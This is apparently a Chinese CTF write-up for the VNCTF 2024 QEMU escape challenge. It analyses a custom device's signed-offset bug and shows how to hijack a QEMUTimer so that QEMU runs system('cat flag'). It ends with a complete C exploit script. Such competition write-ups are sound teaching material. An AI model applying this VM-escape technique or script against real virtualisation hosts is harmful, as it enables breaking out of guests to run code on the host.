---
layout: post
title: VNCTF 2024 escape_langlang_mountain2
date: 2024-02-18 21:23:25
tags: pwn qemu
---

第一次从qemu里面逃出来，但没有完全逃出来，远程没通比赛就结束了S.H.I.T

题目链接：[xtxtn/vnctf2024-escape_langlang_mountain2wp (github.com)](https://github.com/xtxtn/vnctf2024-escape_langlang_mountain2wp)

关于qemu pwn入门，网上中文资料非常多：
- [QEMU - CTFwiki](https://ctf-wiki.org/pwn/virtualization/qemu/basic-knowledge/dev/)
- [QEMU 逃逸 潦草笔记 - xuanxuanblingbling](https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/09/qemu/)
- [QEMU 简易食用指南 - Arttnba3](https://arttnba3.cn/2022/07/15/VIRTUALIZATION-0X00-QEMU-PART-I/)
- [虚拟机逃逸初探 - l0tus](https://l0tus.vip/cn/qemu_escape/) l0tus师傅什么时候更新啊！！

## 环境与调试

理想的环境是 qemu 内的系统有 ssh，这样就可以直接连上去，甚至使用 scp 传 payload，但是这题没有。
我采用的调试方法是在 Dockerfile 中加一个 gdb，这样就可以在 docker 中调试，但是最佳的调试方法应该是往 docker 里面塞一个 gdbserver，然后用主机的 gdb attach 上去，这样就可以使用主机里的插件。

## 漏洞分析

题目实现设备提供了 `vn_mmio_read` 和 `vn_mmio_write` 两个函数。

```c
__int64 __fastcall vn_mmio_read(const char ****a1, __int64 a2)
{
  int v3; // [rsp+2Ch] [rbp-14h]
  __int64 v4; // [rsp+30h] [rbp-10h]

  v4 = (__int64)object_dynamic_cast_assert(a1, "vn", "../qemu-8.1.4/hw/misc/vnctf.c", 21u, "vn_mmio_read");
  if ( a2 == 0x10 )
  {
    return *(int *)(v4 + 0xB80);
  }
  else if ( a2 == 32 )
  {
    return *(int *)(*(int *)(v4 + 0xB80) + 0xB40LL + v4);
  }
  return v3;
}
```

`object+0xb80` 用来保存一个偏移，该函数可以根据缓冲区的相对偏移读数据。

```c
void __fastcall vn_mmio_write(const char ****a1, unsigned __int64 a2, unsigned __int64 a3)
{
  __int64 v5; // [rsp+30h] [rbp-10h]

  v5 = (__int64)object_dynamic_cast_assert(a1, "vn", "../qemu-8.1.4/hw/misc/vnctf.c", 42u, "vn_mmio_write");
  if ( a2 == 48 )
  {
    if ( !*(_DWORD *)(v5 + 0xB84) )
    {
      *(_DWORD *)(v5 + *(int *)(v5 + 0xB80) + 0xB40LL) = a3;// 一次int范围内任意写
      *(_DWORD *)(v5 + 0xB84) = 1;
    }
  }
  else if ( a2 <= 0x30 )
  {
    if ( a2 == 16 )
    {
      if ( (int)a3 <= 60 )
        *(_DWORD *)(v5 + 0xB80) = a3;
    }
    else if ( a2 == 32 && HIDWORD(a3) <= 0x3C )
    {
      *(_DWORD *)(v5 + HIDWORD(a3) + 0xB40) = a3;
    }
  }
  return;
}
```

write 中提供了三个功能：

- addr\=\=16：设置 0xB80 处的偏移变量
- addr\=\=32：正常的 Buffer 内读写（0x40 大小空间，没有越界）
- addr\=\=48：根据偏移变量写入数据（仅限一次）

在检查偏移变量的大小时，由于检查类型是 signed，因此可以把偏移修改为一个负数。于是我们就可以有无限次的任意相对地址读，以及一次任意相对地址写入。

## 漏洞利用

整体思路：
1. 在设备 Object 结构体内寻找堆地址和程序地址并泄露
2. 从 main_loop_tlg 泄露出第二个 timerlist 的地址
3. 在设备 Buffer 中伪造 QEMUTimer 结构体
4. 劫持 timerlist 的 active_timers 指针为伪造的结构体

### 地址泄露

由于我第一次打 qemu pwn，对于其中各种结构体都比较陌生，所以我直接用本办法，在动态调试的时候查看 Buffer 前面的数据，从里面找到可以泄露的指针。（从而给后面本地打得通远程打不通埋下了伏笔）

在不清除结构体信息的情况下，找泄露的时候需要注意一些查找要点：
- 泄露程序基地址时，随便找一个指向程序某地址的指针泄露就行了；
- 泄露堆地址时要注意，不同环境之间的堆环境可能不一样，因此在寻找时（假设我们想要泄露设备 Buffer 的地址）：
    - 最佳的泄露用指针是和 Buffer 处于同一个结构体中的指针
    - 其次是和 Buffer 所在结构体位置相近的指针，越相近越好
- ~~计算堆基址并没有什么用~~

根据这种方法可以找到两个指针，然后泄露即可。

当然，如果你是一位对设备的 Object 结构体比较熟悉的 qemu pwn 大师，那么你就可以直接泄露结构体的某些字段来泄露程序和堆的地址。具体来说，可以通过 MemoryRegion 结构体：

```c
struct MemoryRegion {
    ...
    ...
    DeviceState *dev;

    const MemoryRegionOps *ops;
    void *opaque;
    MemoryRegion *container;
    ...
    ...
}
```

其中，`ops` 指向 data 段的 `vn_mmio_ops`，`opaque` 更是指向 vn 的设备结构体，因此泄露这两个指针就可以准确泄露地址，不用担心什么偏移不一样的问题。

### 控制流劫持

在网上可以找到的大部分 pwn 题中，设备本身就有一些函数指针，劫持它们就可以劫持控制流（甚至参数），但本题的设备就是单纯的读和写，并没有什么 `encode`、`rand` 之类的函数。因此，本题需要一个通用的控制流劫持方法。

在 Qemu 中，可以通过注册一个 QEMUTimer 来让 qemu 在一段时间间隔之后调用一个函数，参数为一个 opauqe 指针。相关结构体定义如下：

```c
struct QEMUTimer {
    int64_t expire_time;        /* in nanoseconds */
    QEMUTimerList *timer_list;
    QEMUTimerCB *cb;
    void *opaque;
    QEMUTimer *next;
    int scale;
};

struct QEMUTimerList {
    QEMUClock *clock;
    QemuMutex active_timers_lock;
    QEMUTimer *active_timers;
    QLIST_ENTRY(QEMUTimerList) list;
    QEMUTimerListNotifyCB *notify_cb;
    void *notify_opaque;
    QemuEvent timers_done_ev;
};
```

从内存视角看两个结构体长这样：

```c
struct QEMUTimer {
    int64_t expire_time;        /* in nanoseconds */
    void *timer_list;
    void *cb;
    void *opaque;
    void *next;
    int scale;
};

struct QEMUTimerList {
    void * clock;
    char active_timers_lock[0x38];
    struct QEMUTimer *active_timers;
    struct QEMUTimerList *le_next;   /* next element */                      \
    struct QEMUTimerList **le_prev;  /* address of previous next element */  \
    void *notify_cb;
    void *notify_opaque;

    /* lightweight method to mark the end of timerlist's running */
    size_t timers_done_ev;
};
```

在 bss 段有一个数组 `main_loop_tlg[4]`，保存了一些 `QEMUTimerList` 结构体指针，每个 `active_timers` 都指向一个由 `QEMUTimer` 结构体组成的链表。qemu 会遍历这些 `QEMUTimerList` 来检查所有 `QEMUTimer` 有没有超时并调用它们的 callback 函数（也就是调用 `timer->cb(timer->opaque)`，相关源码见[qemu-timer.c - util/qemu-timer.c - Qemu source code (v4.2.1) - Bootlin](https://elixir.bootlin.com/qemu/v4.2.1/source/util/qemu-timer.c#L588)）。

因此，我们可以在通过 `main_loop_tlg` 泄露某个 timerlist 的地址后，劫持它的 `active_timers` 指针并伪造一个 `QEMUTimer` 结构体，从而控制程序调用函数以及参数。

伪造 `QEMUTimer` 时，可以这样写：

```c
timer->expire_time = 0x114514;
timer->timer_list = 对应的timer_list地址;
timer->cb = system@plt;
timer->opaque = "cat flag";
timer->next = null;
timer->scale = 0x100000000;
```

这样程序就会在 0x114514 纳秒之后调用 `system("cat flag")`。

该方法主要参考了：
- [QEMU VM Escape - bi0s](https://blog.bi0s.in/2019/08/13/Pwn/VM-Escape/2019-07-29-qemu-vm-escape-cve-2019-14378/)
- [CVE-2020-14364 - xtxtn's Blog](https://xtxtn.github.io/2023/10/11/CVE-2020-14364/#%E4%BF%AE%E6%94%B9time-list)

### EXP 脚本

没有在在线环境下试过这个脚本，不过猜测在线问题不大\=\=。

```c
#define _GUN_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>

unsigned char* mmio_mem;
uint32_t mmio_read(uint64_t addr)
{
    return *((uint32_t *)(mmio_mem + addr));
}
uint32_t mmio_write(uint64_t addr, uint64_t value)
{
    return *((uint32_t *)(mmio_mem + addr)) = value;
}

uint64_t buffer_write(uint64_t index, uint32_t value)
{
    return *((uint64_t *)(mmio_mem + 32)) = (index<<32) | value;
}


int main(int argc ,char **argv, char **envp)
{
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd < 0){
        puts("open mmio failed");
        exit(-1);
    }

    mmio_mem = mmap(0,0x1000,PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED){
        puts("mmap failed !");
        exit(-1);
    }

    uint64_t prog_base = 0;

    mmio_write(16, -0x88);
    prog_base += mmio_read(32) - 0x82b35b;
    mmio_write(16, -0x84);
    prog_base |= ((uint64_t)mmio_read(32))<<32;

    printf("[*]prog_base: 0x%lx\n", prog_base);

    uint64_t heap_base = prog_base & ~(uint64_t)0xffffffff;
    mmio_write(16, -2808);
    heap_base += mmio_read(32) - 192;
    uint64_t buf_addr = heap_base;
    printf("[*]buffer: 0x%lx\n", buf_addr);

    // leak timer
    uint64_t main_loop_tlg = prog_base + 0x14B9480;
    mmio_write(16, main_loop_tlg+8-buf_addr);
    uint64_t timer_list = (prog_base&(~(uint64_t)0xffffffff)) + mmio_read(32);
    uint64_t timer_ptr = timer_list + 0x40;

    printf("[*]timer_list: 0x%lx\n", timer_list);

    // fake timer
    uint64_t system_plt = prog_base + 0x312040;

    buffer_write(0, 0x114514);
    buffer_write(8, timer_list&0xffffffff);
    buffer_write(12, timer_list>>32);
    buffer_write(16, system_plt&0xffffffff);
    buffer_write(20, system_plt>>32);
    buffer_write(24, (buf_addr+0x30)&0xffffffff);
    buffer_write(28, (buf_addr+0x30)>>32);
    buffer_write(44, 1);
    buffer_write(48, 0x20746163); // cat\x20
    buffer_write(52, 0x67616c66); // flag
    buffer_write(56, 0);          // \0

    // 劫持 target
    int offset = timer_ptr - buf_addr;
    printf("[-]offset: %d\n", offset);
    mmio_write(16, offset);
    mmio_write(48, buf_addr&0xffffffff);

    return 0;
}
```

